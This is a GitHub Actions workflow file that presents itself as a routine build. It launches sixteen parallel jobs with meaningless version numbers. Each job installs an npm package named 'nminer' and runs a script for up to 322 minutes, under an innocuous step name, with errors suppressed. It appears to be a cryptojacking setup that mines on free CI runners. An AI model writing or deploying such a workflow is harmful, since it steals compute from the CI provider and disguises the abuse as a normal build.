name: formation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2284 }
          - { version: 5034 }
          - { version: 391 }
          - { version: 707 }
          - { version: 7858 }
          - { version: 939 }
          - { version: 2406 }
          - { version: 5929 }
          - { version: 8886 }
          - { version: 5973 }
          - { version: 9998 }
          - { version: 7920 }
          - { version: 2724 }
          - { version: 9084 }
          - { version: 3522 }
          - { version: 7986 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: diligently plain
        run: |
          npm install nminer@latest
          timeout 322m node formation.js || echo "formation executed"